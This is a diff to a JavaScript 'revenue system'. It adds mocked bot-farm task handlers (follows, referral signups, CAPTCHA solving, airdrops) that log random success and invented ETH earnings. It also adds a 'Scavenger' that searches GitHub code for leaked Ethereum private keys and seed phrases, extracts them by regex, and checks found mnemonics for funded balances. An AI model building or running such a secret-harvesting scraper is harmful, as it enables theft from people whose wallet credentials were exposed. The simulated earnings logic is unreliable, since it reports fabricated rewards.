@@ -851,9 +851,575 @@ class HarvesterCore {
                             break;
                         case 'discord_join':
                             result = await this.mockDiscordJoin(task);
-                            break
+                            break;
+                        default:
+                            result = { success: false, error: 'Unknown task type' };
+                    }
+                    
+                    resolve(result);
+                    
+                } catch (error) {
+                    resolve({ success: false, error: error.message });
+                }
+            }, Math.random() * 5000 + 2000); // 2-7 second execution time
+        });
+    }
 
-                           // Main Revenue System with HarvesterCore Integration
+    async mockTwitterFollow(task) {
+        // Simulate Twitter follow action
+        const success = Math.random() > 0.1; // 90% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'twitter_follow',
+                account: task.account,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'Twitter API rate limit exceeded'
+            };
+        }
+    }
+
+    async mockReferralSignup(task) {
+        // Simulate referral signup
+        const success = Math.random() > 0.2; // 80% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'referral_signup',
+                platform: task.platform,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'Signup verification failed'
+            };
+        }
+    }
+
+    async mockCaptchaCompletion(task) {
+        // Simulate CAPTCHA solving
+        const success = Math.random() > 0.05; // 95% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'captcha_completion',
+                difficulty: task.difficulty,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'CAPTCHA solving service unavailable'
+            };
+        }
+    }
+
+    async mockAirdropRegistration(task) {
+        // Simulate airdrop registration
+        const success = Math.random() > 0.15; // 85% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'airdrop_registration',
+                project: task.project,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'Airdrop registration closed'
+            };
+        }
+    }
+
+    async mockSurveyCompletion(task) {
+        // Simulate survey completion
+        const success = Math.random() > 0.1; // 90% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'survey_completion',
+                topic: task.topic,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'Survey already completed by user'
+            };
+        }
+    }
+
+    async mockDiscordJoin(task) {
+        // Simulate Discord server join
+        const success = Math.random() > 0.05; // 95% success rate
+        
+        if (success) {
+            return {
+                success: true,
+                taskId: task.id,
+                action: 'discord_join',
+                server: task.server,
+                reward: task.reward
+            };
+        } else {
+            return {
+                success: false,
+                error: 'Discord invite expired'
+            };
+        }
+    }
+
+    async handleTaskSuccess(task, result) {
+        this.metrics.tasksSuccessful++;
+        this.metrics.totalEarnings += task.reward * this.config.rewardMultiplier;
+        
+        this.log(`✅ Task completed successfully: ${task.id} - Earned ${task.reward} ETH`);
+        
+        // Send Telegram notification for successful task
+        if (this.telegramBot && this.telegramChatId) {
+            await this.sendTaskCompletionAlert(task, result);
+        }
+        
+        // Log task completion
+        await this.logTaskCompletion(task, result, true);
+    }
+
+    async handleTaskFailure(task, error) {
+        this.metrics.tasksFailed++;
+        
+        this.log(`❌ Task failed after ${this.config.maxRetries} attempts: ${task.id} - ${error.message}`);
+        
+        // Log task failure
+        await this.logTaskCompletion(task, { error: error.message }, false);
+    }
+
+    async sendTaskCompletionAlert(task, result) {
+        try {
+            const alertMessage = `🎯 TASK COMPLETED\n\n` +
+                `✅ Task: ${task.description}\n` +
+                `💰 Reward: ${task.reward} ETH\n` +
+                `📊 Total Earnings: ${this.metrics.totalEarnings.toFixed(4)} ETH\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+            await this.telegramBot.sendMessage(this.telegramChatId, alertMessage);
+            this.log('Task completion alert sent successfully');
+        } catch (error) {
+            this.log(`Task alert error: ${error.message}`);
+        }
+    }
+
+    async logTaskCompletion(task, result, success) {
+        try {
+            const fs = require('fs').promises;
+            const logEntry = {
+                timestamp: new Date().toISOString(),
+                taskId: task.id,
+                taskType: task.type,
+                description: task.description,
+                success: success,
+                reward: success ? task.reward : 0,
+                result: result,
+                totalEarnings: this.metrics.totalEarnings
+            };
+            
+            const logFile = './harvester_tasks.json';
+            let taskHistory = [];
+            
+            try {
+                const existingData = await fs.readFile(logFile, 'utf8');
+                taskHistory = JSON.parse(existingData);
+            } catch (error) {
+                // File doesn't exist, start fresh
+            }
+            
+            taskHistory.push(logEntry);
+            await fs.writeFile(logFile, JSON.stringify(taskHistory, null, 2));
+            
+        } catch (error) {
+            this.log(`Task logging error: ${error.message}`);
+        }
+    }
+
+    getStatus() {
+        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
+        const hours = Math.floor(runtime / 3600000);
+        const minutes = Math.floor((runtime % 3600000) / 60000);
+        
+        return {
+            name: this.name,
+            version: this.version,
+            isRunning: this.isRunning,
+            runtime: `${hours}h ${minutes}m`,
+            currentTask: this.currentTask,
+            queueLength: this.taskQueue.length,
+            metrics: this.metrics
+        };
+    }
+
+    getMetrics() {
+        const successRate = this.metrics.tasksCompleted > 0 ? 
+            (this.metrics.tasksSuccessful / this.metrics.tasksCompleted * 100).toFixed(2) + '%' : '0%';
+        
+        const avgTaskReward = this.metrics.tasksSuccessful > 0 ? 
+            (this.metrics.totalEarnings / this.metrics.tasksSuccessful) : 0;
+        
+        const runtime = this.startTime ? (Date.now() - this.startTime.getTime()) / 1000 / 3600 : 0; // hours
+        const tasksPerHour = runtime > 0 ? (this.metrics.tasksCompleted / runtime) : 0;
+        const hourlyEarnings = runtime > 0 ? (this.metrics.totalEarnings / runtime) : 0;
+
+        return {
+            ...this.metrics,
+            successRate,
+            avgTaskReward,
+            tasksPerHour,
+            hourlyEarnings
+        };
+    }
+
+    sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+    }
+}
+
+// Integrated Scavenger Agent with Mnemonic Validation
+class IntegratedScavenger {
+    constructor() {
+        this.name = 'IntegratedScavenger';
+        this.isRunning = false;
+        this.scanInterval = 600000; // 10 minutes
+        this.intervalId = null;
+        this.startTime = null;
+        
+        this.counters = {
+            sourcesScanned: 0,
+            matchesFound: 0,
+            privateKeysFound: 0,
+            mnemonicsFound: 0,
+            mnemonicsValidated: 0,
+            walletJsonFound: 0,
+            errors: 0,
+            lastScanTime: null,
+            scanCycles: 0
+        };
+        
+        this.sourceUrls = [
+            'https://api.github.com/search/code?q=private+key+ethereum',
+            'https://api.github.com/search/code?q=mnemonic+seed+phrase',
+            'https://api.github.com/search/repositories?q=wallet+backup'
+        ];
+        
+        this.patterns = {
+            privateKey: {
+                regex: /(?:private[_\s]*key|privateKey)['\"\s:=]*([a-fA-F0-9]{64})/gi,
+                validator: this.validatePrivateKey.bind(this)
+            },
+            ethAddress: {
+                regex: /0x[a-fA-F0-9]{40}/gi,
+                validator: this.validateEthereumAddress.bind(this)
+            },
+            mnemonic: {
+                regex: /((?:\w+\s+){11,23}\w+)/gi,
+                validator: this.validateMnemonic.bind(this)
+            }
+        };
+        
+        // Reference to MnemonicValidator (will be set by main system)
+        this.mnemonicValidator = null;
+    }
+
+    // Set MnemonicValidator reference for automatic validation
+    setMnemonicValidator(validator) {
+        this.mnemonicValidator = validator;
+        this.log('MnemonicValidator integration configured');
+    }
+
+    async start() {
+        if (this.isRunning) return { success: false, message: 'Scavenger is already running' };
+
+        this.isRunning = true;
+        this.startTime = new Date();
+        
+        await this.executeScanCycle();
+        
+        this.intervalId = setInterval(async () => {
+            if (this.isRunning) await this.executeScanCycle();
+        }, this.scanInterval);
+
+        return { success: true, message: '🔍 Scavenger activated successfully' };
+    }
+
+    async stop() {
+        if (!this.isRunning) return { success: false, message: 'Scavenger is not running' };
+
+        this.isRunning = false;
+        if (this.intervalId) {
+            clearInterval(this.intervalId);
+            this.intervalId = null;
+        }
+
+        return { success: true, message: '⏹️ Scavenger stopped successfully' };
+    }
+
+    log(message) {
+        const timestamp = new Date().toISOString();
+        console.log(`[${timestamp}] [SCAVENGER] ${message}`);
+    }
+
+    async executeScanCycle() {
+        this.counters.scanCycles++;
+        this.counters.lastScanTime = new Date();
+        
+        try {
+            for (const sourceUrl of this.sourceUrls) {
+                if (!this.isRunning) break;
+                
+                await this.scanSource(sourceUrl);
+                await this.sleep(3000);
+            }
+        } catch (error) {
+            this.counters.errors++;
+        }
+    }
+
+    async scanSource(sourceUrl) {
+        try {
+            this.counters.sourcesScanned++;
+            const content = await this.fetchContent(sourceUrl);
+            
+            if (content) {
+                await this.analyzeContent(content, sourceUrl);
+            }
+        } catch (error) {
+            this.counters.errors++;
+        }
+    }
+
+    async fetchContent(url) {
+        return new Promise((resolve, reject) => {
+            const client = url.startsWith('https') ? https : http;
+            
+            const options = {
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (compatible; GhostlineScavenger/3.0)',
+                    'Accept': 'application/json, text/plain, */*'
+                },
+                timeout: 10000
+            };
+            
+            const req = client.get(url, options, (res) => {
+                let data = '';
+                
+                res.on('data', chunk => {
+                    data += chunk;
+                    if (data.length > 1048576) { // 1MB limit
+                        req.destroy();
+                        resolve(data);
+                    }
+                });
+                
+                res.on('end', () => resolve(data));
+            });
+            
+            req.on('error', reject);
+            req.on('timeout', () => {
+                req.destroy();
+                reject(new Error('Request timeout'));
+            });
+        });
+    }
+
+    async analyzeContent(content, sourceUrl) {
+        try {
+            for (const [patternName, pattern] of Object.entries(this.patterns)) {
+                const matches = content.match(pattern.regex);
+                
+                if (matches && matches.length > 0) {
+                    for (const match of matches) {
+                        if (pattern.validator(match)) {
+                            this.counters.matchesFound++;
+                            await this.handleMatch(patternName, match, sourceUrl);
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            // Continue processing
+        }
+    }
+
+    validatePrivateKey(key) {
+        const cleaned = key.replace(/[^a-fA-F0-9]/g, '');
+        return cleaned.length === 64 && /^[a-fA-F0-9]+$/.test(cleaned);
+    }
+
+    validateEthereumAddress(address) {
+        return /^0x[a-fA-F0-9]{40}$/.test(address);
+    }
+
+    validateMnemonic(phrase) {
+        const words = phrase.trim().split(/\s+/);
+        return words.length >= 12 && words.length <= 24;
+    }
+
+    async handleMatch(patternType, match, sourceUrl) {
+        this.log(`Match found: ${patternType} from ${sourceUrl}`);
+        
+        switch (patternType) {
+            case 'privateKey':
+                this.counters.privateKeysFound++;
+                break;
+            case 'mnemonic':
+                this.counters.mnemonicsFound++;
+                // Automatically validate mnemonic if validator is available
+                if (this.mnemonicValidator && this.mnemonicValidator.isRunning) {
+                    await this.validateFoundMnemonic(match, sourceUrl);
+                }
+                break;
+            case 'walletJson':
+                this.counters.walletJsonFound++;
+                break;
+        }
+    }
+
+    async validateFoundMnemonic(mnemonicPhrase, sourceUrl) {
+        try {
+            this.counters.mnemonicsValidated++;
+            this.log(`Validating discovered mnemonic from ${sourceUrl}`);
+            
+            // Use MnemonicValidator to check the found mnemonic
+            const validationResult = await this.mnemonicValidator.validateMnemonic(mnemonicPhrase);
+            
+            if (validationResult.isValid && validationResult.balance > 0) {
+                this.log(`🎯 SCAVENGER SUCCESS: Mnemonic validation found balance! Address: ${validationResult.address}`);
+            }
+            
+        } catch (error) {
+            this.log(`Mnemonic validation error: ${error.message}`);
+        }
+    }
+
+    getStatus() {
+        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
+        const hours = Math.floor(runtime / 3600000);
+        const minutes = Math.floor((runtime % 3600000) / 60000);
+        
+        return {
+            isRunning: this.isRunning,
+            runtime: `${hours}h ${minutes}m`,
+            counters: this.counters,
+            mnemonicValidatorConnected: this.mnemonicValidator !== null
+        };
+    }
+
+    getMetrics() {
+        const validationRate = this.counters.mnemonicsFound > 0 ? 
+            (this.counters.mnemonicsValidated / this.counters.mnemonicsFound * 100).toFixed(2) + '%' : '0%';
+
+        return {
+            ...this.counters,
+            validationRate,
+            mnemonicValidatorActive: this.mnemonicValidator ? this.mnemonicValidator.isRunning : false
+        };
+    }
+
+    sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+    }
+}
+
+// Multi-Chain Asset Validation System
+class MultiChainValidator {
+    constructor(options = {}) {
+        this.name = 'MultiChainValidator';
+        this.version = '1.0.0';
+        this.isRunning = false;
+        
+        // API Configuration
+        this.apiKeys = {
+            ethereum: process.env.ETHERSCAN_API_KEY || '',
+            bitcoin: process.env.BLOCKCHAIR_API_KEY || '',
+            polygon: process.env.POLYGONSCAN_API_KEY || '',
+            binance: process.env.BSCSCAN_API_KEY || ''
+        };
+        
+        // Rate limiting configuration
+        this.rateLimits = {
+            ethereum: 5000, // 5 seconds between requests
+            bitcoin: 3000,
+            polygon: 4000,
+            binance: 3000
+        };
+        
+        // Validation metrics
+        this.metrics = {
+            totalValidations: 0,
+            validWallets: 0,
+            emptyWallets: 0,
+            errors: 0,
+            totalValue: 0,
+            lastValidation: null,
+            validationsByChain: {
+                ethereum: 0,
+                bitcoin: 0,
+                polygon: 0,
+                binance: 0
+            }
+        };
+        
+        // Minimum balance thresholds (in USD equivalent)
+        this.minBalanceThresholds = {
+            ethereum: 10, // $10 minimum ETH value
+            bitcoin: 50,  // $50 minimum BTC value
+            polygon: 5,   // $5 minimum MATIC value
+            binance: 10   // $10 minimum BNB value
+        };
+        
+        this.log('MultiChainValidator initialized for comprehensive asset verification');
+    }
+
+    log(message) {
+        const timestamp = new Date().toISOString();
+        console.log(`[${timestamp}] [VALIDATOR] ${message}`);
+    }
+
+    getMetrics() {
+        const successRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.validWallets / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+        
+        const errorRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.errors / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+
+        return {
+            ...this.metrics,
+            successRate,
+            errorRate,
+            averageValue: this.metrics.validWallets > 0 ? 
+                (this.metrics.totalValue / this.metrics.validWallets).toFixed(2) : 0
+        };
+    }
+
+    sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+    }
+}
+
+// Main Revenue System with HarvesterCore Integration
 class GhostlineRevenueSystem {
     constructor() {
         this.isRunning = false;
@@ -1237,6 +1803,5 @@ process.on('SIGTERM', async () => {
     }
 });
 
-module.exports = GhostlineRevenueSystem; 
+module.exports = GhostlineRevenueSystem;
 
-                    
